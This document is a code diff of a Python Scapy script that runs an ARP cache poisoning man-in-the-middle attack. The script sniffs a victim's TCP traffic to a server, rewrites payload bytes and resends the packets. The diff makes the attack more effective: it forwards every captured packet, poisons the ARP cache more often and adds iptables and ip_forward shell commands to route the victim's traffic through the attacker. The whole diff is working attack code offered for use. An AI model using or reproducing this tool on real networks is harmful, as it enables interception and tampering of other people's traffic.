@@ -20,8 +20,11 @@ def pkgchan(pkt):
 		f=f.replace('MO639','Ooops') # data change, mission accomplished! 
 		pkt[TCP].payload=f
 		del pkt[TCP].chksum  # checksum isn't automatic updated
+		print "[+] Package Temped!"
 		#pkt.show()
-		sendp(pkt)
+
+	#Sending every captured packets, temped or not 
+	sendp(pkt)
 
 # ARP Cache Poison 
 # Mode 1 poison
@@ -37,10 +40,10 @@ def arpp(target, victim,mode):
 	poison= Ether(dst=vmac,src=fsrc)/ARP(op="is-at",hwdst=vmac,hwsrc=fsrc,psrc=target, pdst=victim) # Scapy don't update ARP HW addrs automatically 
 	#poison.show()
 	while 1:
-		sendp(poison)
+		sendp(poison,verbose=0)
 		if brk:
 			break
-		time.sleep(30) # High delay to have low traffic at tcpdump analysis
+		time.sleep(5) # High delay to have low traffic at tcpdump analysis
 		
 
 
@@ -48,7 +51,7 @@ def arpp(target, victim,mode):
 
 if len(sys.argv) < 3 or os.geteuid() != 0:
 	print "[*] Usage:", sys.argv[0] ," victim_ip[can be broadcast addr]  target_ip [iface (default eth0)]"
-	print "[!] Make sure you're root and have *packet forwarding* on kernel enabled!\n"
+	print "[!] Make sure you're *root*!\n"
 	sys.exit(0)
 else:
 	client=sys.argv[1]
@@ -59,12 +62,19 @@ if len(sys.argv) < 4:
 else:
 	interface = sys.argv[3]
 
+# Avoiding the kernel sending packets direct to client.. and enabling ip forward on kernel 
+# Only works on Linux!
+cmd="iptables -t filter -A FORWARD -p tcp -s %s -d %s -j DROP;echo 1> /proc/sys/net/ipv4/ip_forward"%(client,server)
+os.system(cmd)
+
+
 iface=interface
 # Arp poison =]
 th=Thread(target=arpp,args=(server,client,1))
 
 try:
 	th.daemon=True
+	print "[*] ARP Poison started"
 	th.start()
 	sniff(filter='(tcp and (dst %s and src %s))'%(server,client),prn=pkgchan,store=0)
 except:
